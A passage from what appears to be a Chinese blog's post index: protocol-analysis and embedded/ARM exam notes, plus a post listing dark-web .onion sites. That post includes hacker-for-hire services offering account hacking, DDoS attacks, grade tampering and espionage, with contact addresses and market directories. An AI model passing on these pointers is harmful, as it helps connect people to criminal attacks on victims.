Point)，服务用户通过SAP调用服务，<u>一个SAP拥有唯一的地址</u>。服务用户通过<u>在一个SAP递交数据</u>并从<u>另一个SAP读出</u>。</li>\n<li>在进行交互时所要交换的一些必须信息(或命令)称为<strong>服务原语</strong>(Service Primitives)，以表明需要本地的或远端的对等实体做什么事情。<u>原语告诉服务实体要执行某个动作，或者将对等实体所执行的动作报告给服务用户</u>。服务的调用是通过SP描述的，具体而言，SP就是服务用户与服务提供者之间的交互的抽象描述，并不限定这些交互如何实现。</li>\n<li>每层均可使用的<strong>4</strong>种服务原语。Request/Indication/Response/Confirm</li>\n<li>一个(n)实体向上一层所提供的服务由以下三部分构成： <u>(n)实体自己提供的某些功能</u>、<u>通过与处在另一系统中的对等(n)实体的通信而得到的服务</u>、<u>从(n-1)层及其以下各层以及本地系统环境得到的服务</u>。将(n)层对等实体之间，为实现该层协议所交换的信息单元称为<strong>协议数据单元PDU</strong> (Protocol Data Unit)。通常将第n层的协议数据单元记为(n)PDU。</li>\n<li>PDU通常由2部分构成：<strong>用户数据</strong>和<strong>协议控制信息PCI</strong>(Protocol Control Information)。PDU两种类型：<strong>数据PDU</strong>、<strong>控制PDU</strong>（不携带用户数据）。在不同的协议层次中，PDU还的一些其它的表示法：<u>物理层：比特(bit)</u>；<u>数据链路层：帧(frame)或信元(cell)</u>；<u>网络层 ：分组或包(packet)</u> ；<u>传输层 ：分段(segment)、数据报(datagram)</u>；<u>应用层：消息(message)</u>。</li>\n<li>OSI将层与层之间交换的数据的单元称为<strong>服务数据单元SDU</strong> (Service Data Unit)。<em>一个(n)服务数据单元就是(n)服务所要传送的逻辑数据单元。SDU就是数据PDU中的用户数据，但不一定是一一对应关系。 可以是多个SDU合成为一个PDU(称为“拼装”)，也可以是将一个SDU划分为几个PDU(称为“分段”)。</em></li>\n<li>协议是“水平的”，即协议是<u>控制对等实体之间通信的规则</u>。服务是“垂直的”，即服务是<u>由下层向上层通过层间接口提供的</u>。<em>“虚拟”指看起来存在但实际上不存在的事物，“透明”相反。</em></li>\n<li>N层中任何两个协议实体通过<u>(n-1)SAP</u>所形成的逻辑数据通路称为<u>(n-1)层通道</u>。通道的类型：空通道、非缓冲通道、缓冲通道。通道队列的主要性质是<u>平均队列长度</u>以及<u>最大队列允许长度</u>。</li>\n<li><strong>回程时延RTT</strong>。从n层源端实体<u>发出报文到该报文的确认信息到达</u>该实体之间的时间间隔，它包括目标实体收到报文之后，对报文进行处理然后发出确认信息的时间。（处理时延、排队时延、发送时延、传播时延）</li>\n<li>如果通道是利用(n-1)层的<u>有</u>（无）连接服务形成的，那么传递的报文<u>不会</u>（有可能）失序。通道的工作方式：单工、半双工、全双工 | 同步与异步。</li>\n<li>协议的两大功能：<strong>连接管理</strong>，<strong>数据交换</strong>。</li>\n</ol>\n<ul>\n<li>连接管理：<ul>\n<li>两种连接：点对点、点对多点</li>\n</ul>\n</li>\n<li>三种主要功能：连接建立、连接释放。连接维护<ul>\n<li>数据交换：</li>\n<li>n层协议接收<u>n层用户递交的(n)SDU</u>（(n-1)层通道的(n)PDU），<u>将之转换成(n)PDU</u>（提取其中的(n)SDU），<u>从(n-1)层通道发送出去</u>（转交给n层用户）。</li>\n<li>一般要实现功能：对齐、分段和合段、拼装和分离、PDU的装配和拆装、SDU的编码与解码、加校验和、抖动补偿、带外数据和紧急数据的发送。<em>(n-1)通道提供的数据通道的可靠性越高，则n层协议需实现的差错控制机制则越少。</em></li>\n</ul>\n</li>\n</ul>\n<ol start=\"12\">\n<li>用来防止丢失、重复和乱序的方法包括：<u>序号、确认、重传、计时器</u>。<em>(n-1)通道提供的数据通道的可靠性越高，则n层协议需实现的差错控制机制则越少。</em></li>\n</ol>\n<ul>\n<li>序号：检测PDU重复、失序、丢失|进行无二义性编号|SDU序号、PDU序号、字节序号|使用一个非常大的序号空间<em>（从一端到另一端的最大可能的延迟时间L内，所有从源点发送出去的新的数据单元都具有不同的序号）</em>序号是确认和重传的基础，此外序号还可用于流量控制 \u0005</li>\n<li>ACK可以确定<u>PDU</u>和<u>字节</u>。可确认的情况：<u>已正确到达</u>，<u>还没有收到</u>，<u>收到但有错(相当于没有收到)</u>。分为三种类型：<u>AcK</u>，<u>Nak</u>，<u>Select Ack</u>。两种发送方式：<u>独立确认</u>（指用一个确认PDU，可随时发送），<u>应答携带</u>（放在数据PDU中可提高效率，但需要接收方有数据发送）。<em>通常在一种协议中两种确认形式均存在</em>。选择确认信息中包含多个序号时有三种格式：<u>表</u>，<u>范围</u>，<u>位图</u>。</li>\n<li>计时器的超时值设置依赖RTT。计时器的超时值<u>太短：大量数据重传，加剧网络拥塞程度</u>；<u>太长：数据丢失得不到及时纠正，降低协议性能</u>。</li>\n<li>基于滑动窗口的重传方法：<u>回退N帧</u>和<u>选择重传</u>。</li>\n</ul>\n<ol start=\"13\">\n<li>N层协议所提供的服务是N层协议外部行为的体现。在协议的控制下， N层的两个对等实体间通信，使其能够向上一层提供服务。要实现本层协议，需要使用下一层所提供的服务。一般用服务规范(Service Specification)来定义和描述N层协议向外部所提供的服务，包括：服务原语和服务原语时序。N 层协议的服务原语和原语参数详细准确地描述了N层协议和它的服务用户之间的接口。</li>\n<li>协议的主体是它的<strong>状态-事件</strong>转换机制 。一个完整的服务原语通常包括<u>原语名字</u>、<u>原语类型</u>和<u>原语参数</u>三大部分，如T-CONNECT.request(被叫地址，主叫地址，……)。</li>\n<li>根据使用服务原语的角度来考虑，可将服务分为两类： <u>需要证实的服务</u>，<u>不需要证实的服务</u>。根据所提供的服务的不同，为完成某功能所需的<u>服务原语的个数</u>和<u>服务原语的时序</u>是不同的。</li>\n<li>三次握手需要用到三个PDU：<u>CR(连接请求)</u>，<u>CC(连接证实)</u>，<u>AK(确认)</u>。</li>\n<li>协议状态分为：<u>局部状态</u>，<u>全局状态</u>。N层协议必须定义<strong>所有的</strong>协议状态。</li>\n<li>协议事件根据用途可分为：<u>输入事件</u>，<u>输出事件</u>。根据作用范围可分为：<strong>通信事件</strong>（收发服务原语或收发PDU，可分为同步时间或叫协同事件和异步事件），<strong>内部事件</strong>。三个性质：<strong>成对性</strong>（通信事件成对，内部事件不成对）、<strong>原子性</strong>、<strong>时序性</strong>。每种协议功能都是通过<strong>一组协议过程的执行</strong>来实现。</li>\n<li>协议操作只有在<u>一定条件</u>（谓词）下才能够被执行。<em>描述一个协议过程必须说明该过程所包含的操作以及执行操作的谓词。</em></li>\n<li>元素之间的有机联系：<strong>在什么协议状态下，在什么输入事件驱动下，调用什么协议过程；协议过程在什么条件下(谓词)，采取什么协议动作(操作)，输出什么事件或修改哪些协议状态和变量。</strong></li>\n<li>协议三种运行方式：<strong>协议交替</strong>、<strong>协议并发</strong>、<strong>协议并行</strong>。</li>\n<li>协议文本中最重要、最主要部分是<strong>协议元素的描述</strong>。必须对每一项协议元素作出<strong>准确、清晰、无二义性</strong>的定义。</li>\n<li>一个好的结构化协议设计，应具有以下特点：<strong><u>简单、模块化</u></strong>、<u>有界性自稳定性和自适应性</u>、<u>健壮性</u>、<u>一致性</u>。前两个最基本。分层设计难点：层<u>次太少会使每一层协议太复杂</u>，太多则在<u>描述和综合各层的系统时难度较大</u>。协议分层优点：<u>各层独立、灵活性好、结构上可分割、易于实现和维护、能促进标准化工作</u>。</li>\n<li>流量控制：<u>发送方以不超过接收方处理能力的速率发送数据</u>。差错控制<u>有全局性</u>。相同：<u>提高网络性能</u>。</li>\n</ol>\n<h1 id=\"三、协议形式化描述技术-概述\"><a href=\"#三、协议形式化描述技术-概述\" class=\"headerlink\" title=\"三、协议形式化描述技术-概述\"></a>三、协议形式化描述技术-概述</h1><ol>\n<li>形式化技术 FDTs (Formal Description Techniques)，FSM是个五元组：FSM = (S, s0, I, delta, F)</li>\n</ol>\n<ul>\n<li>S，有限状态集合。任一确定时刻，FSM只能处于一个确定的状态。</li>\n<li>s0，初始状态，开始接受输入。</li>\n<li>I，有限输入字符集合，任一确定的时刻智能接受一个。</li>\n<li>delta，状态转换函数，</li>\n<li>F，终态集(可空)，不再接收输入。</li>\n</ul>\n<ol start=\"2\">\n<li>Moore 机：输出与状态有关。Moore FSM is 6-tuple: FSM = (S, s0, I, O, delta, lambda)。</li>\n</ol>\n<ul>\n<li>O，有限输出字符集合。</li>\n<li>lambda，s-&gt;O，输出函数。</li>\n<li>Moore机只是在接收输入串的过程中不断改变状态，并且<u>在每个状态上有字符输出</u>。<br><em>有限状态机可看做是Moore机的一个特例。</em><br>对于任何一个有限状态机(S, s0, I, delta, F)，引入输出字符集合 O = {0, 1}，并定义S到O的映射lambda为：s属于F, lambda(s)=1；s不属于F, lambda(s)=0。这样得到一个Moore机M=(S, s0, I, O, delta, lambda)，在该Moore机中，输出为1的状态为终结状态，输出为0的状态即为非终结状态。</li>\n</ul>\n<ol start=\"3\">\n<li>Mealy机：输出与状态和输入有关</li>\n</ol>\n<ul>\n<li>lambda，s*I-&gt;O，输出函数。</li>\n<li>Mealy机只是在接收输入串的过程中不断改变状态，并且<u>字符输出与当前状态及输入串有关</u>。<br><em>Moore机可看做是Mealy机的一个特例。</em><br>对于任何一个Moore机 M=(S, s0, I, O, delta, lambda)，PPT三-32</li>\n</ul>\n<ol start=\"4\">\n<li><p>停等协议的状态变迁表：发帧的2竖列除了准备发且发了的，其他状态都不改变，且斜杠后只有发了的有东西。准备发时收到ACK状态不变。准备发和发了的超时，变为准备发相同的状态。</p>\n</li>\n<li><p><img src=\"%E7%8A%B6%E6%80%81%E5%8F%98%E8%BF%81%E5%9B%BE%E5%90%88%E5%B9%B6%E5%89%8D.png\" alt></p>\n</li>\n<li><p><img src=\"%E7%8A%B6%E6%80%81%E5%8F%98%E8%BF%81%E5%9B%BE%E5%90%88%E5%B9%B6%E5%90%8E.png\" alt></p>\n</li>\n<li><p><img src=\"%E5%81%9C%E7%AD%89%E5%8D%8F%E8%AE%AE%E9%83%BD%E6%9C%89%E7%BC%96%E5%8F%B7.png\" alt></p>\n</li>\n<li><p><img src=\"%E7%8A%B6%E6%80%81%E8%BD%AC%E6%8D%A2%E5%9B%BE%E8%A1%A8%E8%BD%AC%E6%8D%A2.png\" alt></p>\n</li>\n</ol>\n<h1 id=\"四、协议形式化描述技术-PetriNet\"><a href=\"#四、协议形式化描述技术-PetriNet\" class=\"headerlink\" title=\"四、协议形式化描述技术-PetriNet\"></a>四、协议形式化描述技术-PetriNet</h1><ol>\n<li>四元组(P, T , I, O)</li>\n</ol>\n<ul>\n<li>P，位置(places)的有限集合。</li>\n<li>T，变迁(transitions)的有限集合，且T与P不相交。</li>\n<li>I，输入函数，是变迁T到位置的映射。</li>\n<li>O，输出函数，同I。</li>\n<li>点火前，取出标记数量=远离圆的弧线数；点火后，放入标记数量=进入圆的弧线数。</li>\n</ul>\n<ol start=\"2\">\n<li>状态变迁类型：<u>顺序、并发、互斥变迁</u>。</li>\n<li>Petri网的性质：<strong>行为性质</strong>(与初始标记量有关)、<strong>结构性质</strong>(无关)。</li>\n</ol>\n<ul>\n<li>行为性质<ul>\n<li>可达性。</li>\n<li>有界性。(任一可达)位置p为k有界；Petri网为k有界(每个位置都K有界)；有界性意味着位置中的标记数量不会无限地增加。</li>\n<li>安全性。如果位置p为1有界，则称位置p是安全的。</li>\n<li>活性。<em>从M0可达的任一标记向量出发，都可以通过执行某一变迁序列而最终引发变迁t，则称t在标记向量M0下是活的。</em></li>\n<li>可逆性、可覆盖性、可持续性、公平性。</li>\n</ul>\n</li>\n<li>结构性质<ul>\n<li>结构活性、结构有界性、可重复性、相容性结构有界公平性</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"五、SDL\"><a href=\"#五、SDL\" class=\"headerlink\" title=\"五、SDL\"></a>五、SDL</h1><ol>\n<li>规范及其描述语言SDL (Specification and Description Language)。SDL是基于扩展有限状态机和抽象数据类型的混合技术。一个SDL应用的静态结构由<u>系统(System)、功能块(Block)、进程(Process)、过程(Procedure)和通道(Channel)</u>构成。<em>各功能块包含若干个进程，SDL系统的动态行为具体表现为各进程的实例的并发操作。</em></li>\n<li>一般来说，SDL中的数据类型定义包括三个部分：类定义，操作符(Operators)定义和等价式(Equations)定义。</li>\n<li>编程</li>\n</ol>\n<ul>\n<li><p>SDL中的数据类型定义包括三个部分：类定义，操作符(Operators)定义和等价式(Equations)定义</p>\n</li>\n<li><p>类定义：<code>newtype ... endnewtype</code></p>\n</li>\n<li><p>等价式、等值类。等价式参数化：<code>FOR ALL x, z IN Real  ((x/z)*z = = IF z/=0 THEN x ELSE ERROR! FI)</code>。产生器，如：数组、串、幂集。继承<code>INHERITS  Sort1</code></p>\n</li>\n<li><p>记录</p>\n</li>\n</ul>\n<figure class=\"highlight pascal\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//定义</span></span><br><span class=\"line\">STRUCT</span><br><span class=\"line\">\tlast_name, first_name, street, city: Charstring;</span><br><span class=\"line\">\tnumber : Integer;</span><br><span class=\"line\"><span class=\"comment\">//赋值</span></span><br><span class=\"line\">address :=(.Lai, Richard, Carbost Court, Macleod, <span class=\"number\">2</span>.);</span><br><span class=\"line\"><span class=\"comment\">//取出一个变量</span></span><br><span class=\"line\">town := address!city;</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>功能块内通信手段主要包括共享变量或通过信号路由(signal routes)交换信号。信号路由中的箭头在线条的两端。 通道在中间。</li>\n</ul>\n<ol start=\"4\">\n<li><img src=\"%E7%BC%96%E7%A8%8B%E5%92%8C%E5%9B%BE%E7%9A%84%E8%BD%AC%E6%8D%A2.png\" alt></li>\n</ol>\n<h1 id=\"六、协议验证技术\"><a href=\"#六、协议验证技术\" class=\"headerlink\" title=\"六、协议验证技术\"></a>六、协议验证技术</h1><ol>\n<li>通过协议验证，可以获知协议设计是否满足<u>正确性</u>、<u>完整性</u>和<u>一致性</u>等要求。</li>\n</ol>\n<ul>\n<li>服务规范 协议规范的一致</li>\n<li>协议规范 协议实现的一致</li>\n</ul>\n<ol start=\"2\">\n<li>形式化协议验证两类方法：<u>模型检测</u>(可达性分析、不变性分析、重要问题：状态空间爆炸)、<u>演义验证</u>。协议验证着重在于一般性质，而协议测试则着重于特殊性质。</li>\n<li>安全性 v.s. 活动性</li>\n</ol>\n<ul>\n<li>安全性：<ul>\n<li>Bad things never happen。</li>\n<li>协议的所有动作均需与它的服务规范保持一致，且没有不期望的情况出现。</li>\n<li>安全性保证协议不出现错误。</li>\n</ul>\n</li>\n<li>活动性<ul>\n<li>Good things eventually happen。</li>\n<li>在有穷时间内，完成规范所规定的动作(或所有的服务必须在有限时间内完成。</li>\n<li>协议的活动性体现在终止性(termination)和进展性(progress)两个方面。<em>终止性是指协议从任何一个状态开始运行，经过有限时间总能正确地到达终止状态；进展性是指协议从初始状态运行，经过有限时间总能到达指定状态。</em></li>\n</ul>\n</li>\n</ul>\n<ol start=\"4\">\n<li>可达性分析</li>\n</ol>\n<ul>\n<li><p>原理：采用<strong>穷举法</strong>检查同一层内两个或多个协议实体间所有可能的交互所产生的全局状态。</p>\n</li>\n<li><p>三种算法：</p>\n<ul>\n<li><strong>穷尽性可达性分析(完全搜索)算法</strong> (exhaustive or full search)：优点在于可以证明协议中没有错误，当系统状态的数目非常大时，会发生状态空间爆炸。</li>\n<li><strong>受控部分搜索算法</strong>：证明错误的存在，而不是证明没有错误。解决了状态空间爆炸，但只能最大限度地发现错误。</li>\n<li><strong>随即模拟算法</strong>：即使是无限大系统也可以应用。没有明确的终止，无法判断是否已经访问过系统的所有可达状态，也就无法判断是否已经发现了系统的所有错误。不能证明协议中没有错误。</li>\n</ul>\n</li>\n<li><p>解决空间状态爆炸：部分规范描述和验证、选择大的动作单元、分解或划分、按断言来分类状态。</p>\n</li>\n</ul>\n<h1 id=\"七、一致性测试技术\"><a href=\"#七、一致性测试技术\" class=\"headerlink\" title=\"七、一致性测试技术\"></a>七、一致性测试技术</h1><ol>\n<li>“一致性测试”的目的是检查一个给定协议实现的外部行为是否符合协议的规范，“验证”则是检查形式化规范的逻辑正确性。</li>\n</ol>\n<p><em>ps：就是这第七章，当时听谁说不考，就没看多少，结果出了几个小题和一个大题 =_=</em></p>\n","categories":["技术"],"tags":["网络协议分析"]},{"title":"暗网网址整理","url":"https://littleghost2016.github.io/2018/04/29/暗网网址整理/","content":"<p>以下网址有一些可能因为时间过久而停止服务。</p>\n<h1 id=\"搜索引擎\"><a href=\"#搜索引擎\" class=\"headerlink\" title=\"搜索引擎\"></a>搜索引擎</h1><p><a href=\"http://hss3uro2hsxfogfq.onion\" target=\"_blank\" rel=\"noopener\">http://hss3uro2hsxfogfq.onion</a><br><a href=\"https://ahmia.fi/\" target=\"_blank\" rel=\"noopener\">https://ahmia.fi/</a><br><a href=\"https://3g2upl4pq6kufc4m.onion/\" target=\"_blank\" rel=\"noopener\">https://3g2upl4pq6kufc4m.onion/</a> （非暗网搜索专用引擎）</p>\n<h1 id=\"黑客雇佣\"><a href=\"#黑客雇佣\" class=\"headerlink\" title=\"黑客雇佣\"></a>黑客雇佣</h1><p><a href=\"http://hackharhoaw3yk5q.onion/\" target=\"_blank\" rel=\"noopener\">http://hackharhoaw3yk5q.onion/</a>  （与 <a href=\"http://hackerhdikwfubku.onion/\" target=\"_blank\" rel=\"noopener\">http://hackerhdikwfubku.onion/</a> 相同）<br><a href=\"http://2ogmrlfzdthnwkez.onion/\" target=\"_blank\" rel=\"noopener\">http://2ogmrlfzdthnwkez.onion/</a><br><a href=\"http://un62d2ywi33bho53.onion/sm-hack/\" target=\"_blank\" rel=\"noopener\">http://un62d2ywi33bho53.onion/sm-hack/</a><br><a href=\"http://un62d2ywi33bho53.onion/sm-hack/#more-2711\" target=\"_blank\" rel=\"noopener\">http://un62d2ywi33bho53.onion/sm-hack/#more-2711</a><br><a href=\"http://un62d2ywi33bho53.onion/hack-n-crack/#more-2714\" target=\"_blank\" rel=\"noopener\">http://un62d2ywi33bho53.onion/hack-n-crack/#more-2714</a><br><a href=\"http://bm6hsivrmdnxmw2f.onion/\" target=\"_blank\" rel=\"noopener\">http://bm6hsivrmdnxmw2f.onion/</a> （一个列表）<br>-<a href=\"http://bm6hsivrmdnxmw2f.onion/chan/general\" target=\"_blank\" rel=\"noopener\">http://bm6hsivrmdnxmw2f.onion/chan/general</a> （上面网站的一个chans目录）<br><a href=\"http://5fcdrnnrag6pdh6h.onion/\" target=\"_blank\" rel=\"noopener\">http://5fcdrnnrag6pdh6h.onion/</a> （Hack Facebook Account–声称最便宜的）-邮箱：<a href=\"mailto:k1ll3r@torbox3uiot6wchz.onion\" target=\"_blank\" rel=\"noopener\">k1ll3r@torbox3uiot6wchz.onion</a><br><a href=\"http://hackedpounsl3h5h.onion/\" target=\"_blank\" rel=\"noopener\">http://hackedpounsl3h5h.onion/</a><br>–<a href=\"http://hackedpounsl3h5h.onion/\" target=\"_blank\" rel=\"noopener\">http://hackedpounsl3h5h.onion/</a>  -&gt;oniondir网站因欺骗买家而引起公愤被黑，自己又新建立了一个新的网址 <a href=\"http://onionf3ck2i74bmm.onion/\" target=\"_blank\" rel=\"noopener\">http://onionf3ck2i74bmm.onion/</a><br><a href=\"http://4xzg7em4btak4lnu.onion/\" target=\"_blank\" rel=\"noopener\">http://4xzg7em4btak4lnu.onion/</a><br>–C级黑客：hacking of facebook,twitter、email acccounts、and DDOS<br>–B级黑客：黑进学校数据库改成绩、更大型的DDoS、控制个人或者企业电脑<br>–A级黑客：BC两级做不到的<br>-联系方式：<a href=\"mailto:hackerscollective@protonmail.com\" target=\"_blank\" rel=\"noopener\">hackerscollective@protonmail.com</a>  更安全的可使用PGP<br><a href=\"http://pnxauh22krzb5xso.onion/\" target=\"_blank\" rel=\"noopener\">http://pnxauh22krzb5xso.onion/</a>  自称The hack lair（twitter - <a href=\"https://twitter.com/SageHack）\" target=\"_blank\" rel=\"noopener\">https://twitter.com/SageHack）</a><br>-招聘广告：<a href=\"https://hacklair.cyberguerrilla.org/how-to-join-anonymous/\" target=\"_blank\" rel=\"noopener\">https://hacklair.cyberguerrilla.org/how-to-join-anonymous/</a><br><a href=\"http://noscamkvuy26vhn7.onion/\" target=\"_blank\" rel=\"noopener\">http://noscamkvuy26vhn7.onion/</a>  揭露骗子网址的网站<br><a href=\"http://hackhelpnylin6d4.onion/\" target=\"_blank\" rel=\"noopener\">http://hackhelpnylin6d4.onion/</a>  -联系方式：<a href=\"mailto:hackhelp@protonmail.com\" target=\"_blank\" rel=\"noopener\">hackhelp@protonmail.com</a> -曾未丝绸之路工作过，可以为了钱做任何事情，经济间谍和商业间谍<br><a href=\"http://hackcanl2o4lvmnv.onion\" target=\"_blank\" rel=\"noopener\">http://hackcanl2o4lvmnv.onion</a>  专门攻击加拿大<br>-<a href=\"http://hackcanl2o4lvmnv.onion/blackcrawl/index.html\" target=\"_blank\" rel=\"noopener\">http://hackcanl2o4lvmnv.onion/blackcrawl/index.html</a>  免费揭秘政府和大公司的秘密文件<br><a href=\"http://plzhackmedrlnaz2.onion/\" target=\"_blank\" rel=\"noopener\">http://plzhackmedrlnaz2.onion/</a>  求别人hack自己的网站，包括寻找真正的IP、查看文件目录和完全入侵</p>\n<h1 id=\"其他\"><a href=\"#其他\" class=\"headerlink\" title=\"其他\"></a>其他</h1><p>目前看不出来什么网站，不过包含一些总结性的内容（例如对不同语种的论坛总结，总体有总结但数量不多）<br><a href=\"http://zqktlwi4fecvo6ri.onion/wiki/Main_Page\" target=\"_blank\" rel=\"noopener\">http://zqktlwi4fecvo6ri.onion/wiki/Main_Page</a></p>\n<p>一个聊天室，可和随机的对话者聊天，或者指定朋友<br><a href=\"http://tetatl6umgbmtv27.onion/\" target=\"_blank\" rel=\"noopener\">http://tetatl6umgbmtv27.onion/</a></p>\n<p>一个暗网介绍网站，收录的信息和网址比较新和全面<br><a href=\"http://deepweb2teloq5cl.onion\" target=\"_blank\" rel=\"noopener\">http://deepweb2teloq5cl.onion</a></p>\n<p>暗网IRC<br><a href=\"http://3ur4xm2japn56c5f.onion/\" target=\"_blank\" rel=\"noopener\">http://3ur4xm2japn56c5f.onion/</a></p>\n<p>自称正统的匿名者Facebook<br><a href=\"https://www.facebook.com/anonymousforjustice\" target=\"_blank\" rel=\"noopener\">https://www.facebook.com/anonymousforjustice</a></p>\n<p>OnionIRC的推特，11年加入推特，2016年7月2日宣布network无限期关闭<br><a href=\"https://twitter.com/onionirc\" target=\"_blank\" rel=\"noopener\">https://twitter.com/onionirc</a></p>\n<p>一个免费下载电子书的网站<br><a href=\"http://xfmro77i3lixucja.onion/\" target=\"_blank\" rel=\"noopener\">http://xfmro77i3lixucja.onion/</a></p>\n<p>一个中文论坛<br><a href=\"http://almvdkg6vrpmkvk4.onion\" target=\"_blank\" rel=\"noopener\">http://almvdkg6vrpmkvk4.onion</a></p>\n<p>暂时可用网址：<br><a href=\"http://rfwtogljhrrzxyrl.onion/\" target=\"_blank\" rel=\"noopener\">http://rfwtogljhrrzxyrl.onion/</a><br><a href=\"http://mail2tor2zyjdctd.onion/\" target=\"_blank\" rel=\"noopener\">http://mail2tor2zyjdctd.onion/</a> 提供匿名邮件服务</p>\n<p>列出了很多暗网网址：<br><a href=\"http://onionsnjajzkhm5g.onion/onions.php?format=tex\" target=\"_blank\" rel=\"noopener\">http://onionsnjajzkhm5g.onion/onions.php?format=tex</a><br>JSON格式：<a href=\"http://onionsnjajzkhm5g.onion/onions.php?format=json\" target=\"_blank\" rel=\"noopener\">http://onionsnjajzkhm5g.onion/onions.php?format=json</a></p>\n<h1 id=\"暗网中的市场列举\"><a href=\"#暗网中的市场列举\" class=\"headerlink\" title=\"暗网中的市场列举\"></a>暗网中的市场列举</h1><p><a href=\"http://deepweb2teloq5cl.onion/darknet-markets-links/\" target=\"_blank\" rel=\"noopener\">http://deepweb2teloq5cl.onion/darknet-markets-links/</a></p>\n","categories":["技术"],"tags":["暗网"]},{"title":"嵌入式系统复习整理","url":"https://littleghost2016.github.io/2018/01/17/嵌入式系统复习整理/","content":"<h1 id=\"第一部分-概述-侧重概念\"><a href=\"#第一部分-概述-侧重概念\" class=\"headerlink\" title=\"第一部分-概述(侧重概念)\"></a>第一部分-概述(侧重概念)</h1><ol>\n<li><p>嵌入式系统三要素：嵌入性、专用性、计算机。(软件+硬件)</p>\n<pre><code>特点：专用性、小型化(资源有限)、软硬件一体设计、需要交叉开发环境\n   微控制器——存储器在片内;微处理器——存储器在片外</code></pre></li>\n<li><p>嵌入式系统软件一般由嵌入式操作系统和应用软件组成;操作系统是连接计算机硬件与应用程序的系统程序</p>\n<pre><code>实时性分类为：非实时操作系统(如Linux等)、实时操作系统(RTOS)</code></pre></li>\n<li><p>嵌入式的应用：工业控制、交通管理、信息家电、家庭智能管理系统，POS网络及电子商务，电子政务，环境检测，机器人</p>\n</li>\n<li><p>冯诺依曼体系和哈佛体系的区别：使用两个独立的存储器模块，分别存储指令和数据|使用独立的两条总线，分别作为CPU与每个存储器之间的专用通信路径，这两条总线之间毫无关联;一般冯·诺依曼结构采用统一Cache，一般哈佛结构采用独立Cache</p>\n</li>\n<li><p>流水线技术–指令可以并行执行，提高CPU运行效率、内部信息流要求通畅流动</p>\n</li>\n<li><p>RISC指令特点：硬连线的指令译码逻辑、减少指令和寻址方式的种类、大多数指令单周期执行、分开的Load/Store结构的存取指令、固定指令格式</p>\n</li>\n<li><p>RISC复杂在编译器，一个周期执行一条指令，指令长度固定;</p>\n<pre><code>优势：处理器管芯面积小、开发时间少成本低、易高性能。缺点：代码密度低(需要大存储器空间)、不能执行X86代码、优化编译程序困难\n   CISC复杂在处理器，指令长度不固定</code></pre></li>\n<li><p>嵌入式系统的基本设计过程：需求分析、规格说明、体系结构设计、硬件构件软件构件、系统调试与集成<br>可移植操作系统接口–POSIX–Portable Operating System Interface of UNIX</p>\n</li>\n</ol>\n<h1 id=\"第二部分-ARM-Advanced-RISC-Machines\"><a href=\"#第二部分-ARM-Advanced-RISC-Machines\" class=\"headerlink\" title=\"第二部分-ARM = Advanced RISC  Machines\"></a>第二部分-ARM = Advanced RISC  Machines</h1><ol>\n<li>Thumb技术特点：支持Thumb的核有2套独立的指令集、ARM32位指令的性能、Thumb16位的代码密度、性能和代码密度均衡</li>\n<li>ARM状态处理器执行32位的字对齐的ARM指令，开始执行代码时、执行异常处理时应该处于ARM状态;<pre><code>Thumb状态处理器执行16位的、半字对齐的 Thumb 指令。\n程序执行过程中可随时切换。操作数寄存器的状态位(位0)为1，BX指令 ARM-&gt;Thumb</code></pre></li>\n<li>ARM中”字”是32bit(32位),半字16bit，字节8bit</li>\n<li>用户模式(Usr)：用于正常执行程序<br>快速中断模式(FIQ)：用于高速数据传输<br>外部中断模式(IRQ)：用于通常的中断处理<br>管理模式(svc)：操作系统使用的保护模式<br>数据访问终止模式(abt)：当数据或指令预取终止时进入该模式，可用于虚拟存储以及存储保护<br>系统模式(sys)：运行具有特权的操作系统任务<br>未定义指令中止模式(und)：当未定义的指令执行时进入该模式，可用于支持硬件<br>除了用户模式外，其它都是特权模式。除了系统模式外的特权模式是异常模式。异常模式主要处理中断和异常</li>\n<li>37个32 位长的寄存器，不能被同时访问<br>1个用作PC（program counter）;<br>30个用作一般通用寄存器;<br>1个用作CPSR(current program status register);<br>5个用作SPSR(saved program status registers)<br>R0～R7为未分组的寄存器，R8～R14为分组寄存器<br>R8～R12有两个分组的物理寄存器。一个用于除FIQ模式之外的所有寄存器模式，另一个用于FIQ模式。发生FIQ中断后可加速FIQ的处理速度<br>寄存器R13、R14分别有6个分组的物理寄存器。一个用于用户和系统模式，其余5个分别用于5种异常模式<br>R13常作为堆栈指针(SP)<br>R14为链接寄存器(LR)在结构上有两个特殊功能：每种模式R14用于保存子程序返回地址、发生异常R14设置为异常返回地址。用BL或BLX指令调用子程序时，指令先将下一条指令的PC值拷贝给R14<br>R15为程序计数器(PC)，PC的值为当前指令的地址值加8个字节<br>R16为当前程序状态寄存器CPSR(Current Program Status Register)备份的程序状态寄存器SPSR(Saved Program Status Register)异常发生时，SPSR用于保存CPSR的值，从异常退出时则可由SPSR来恢复CPSR<br>Thumb状态下：R0~R7/PC/SP/LR/CPSR</li>\n<li>异常响应过程：PC-&gt;LR，CPSR-&gt;SPSR，根据异常类型，强制设置CPSR的运行模式位，跳转到相应的异常处理程序处<br>异常处理过后：LR-减去一个常量-&gt;PC，SPSR-&gt;CPSR</li>\n</ol>\n<h1 id=\"第三部分-ARM汇编\"><a href=\"#第三部分-ARM汇编\" class=\"headerlink\" title=\"第三部分-ARM汇编\"></a>第三部分-ARM汇编</h1><ol>\n<li><p>带S的(如ADDS)都会影响CPSR</p>\n</li>\n<li><p>每个立即数都由一个8位常数循环右移偶数位得到<br>逻辑移位都补0，算术右移补最高位，只有循环右移没有循环左移，RRX连同C标志循环右移一位<br>ADD    R3，R2，R1，LSR    #2  R3=R2+R1/4</p>\n</li>\n<li><p>U控制位为1时加上偏移量;U控制位为0时减去偏移量<br>事先更新方式：[R1,#4]！<br>事后更新方式：[R1],#4</p>\n</li>\n<li><p>块拷贝寻址是多寄存器传送指令LDM/STM的寻址方式<br>ARM指令中的堆栈形式STMFD/LDMFD  SP！    {R1-R7，LR}    注：一定要带有！<br>Thumb指令中的堆栈形式PUSH/POP     {R1-R7，LR}<br>B[L]-&gt;[将下一条指令的地址拷贝到链接寄存器(R14/LR)]中跳转到指定的地址执行程序<br>BX[L]-&gt;带[连接和]状态切换的跳转指令注：跳转的范围是±32MB，寻址方式：相对寻址<br>CPSR的第5位T，若T置位，则认为指令流为16位的Thumb指令;否则为标准的ARM指令。只有在命名中有字母T的ARM处理器才支持Thumb指令</p>\n</li>\n<li><p>…</p>\n<ol>\n<li>BGLS(A/L) test1–定义全局变量。LCLS–定义局部变量<br>test1 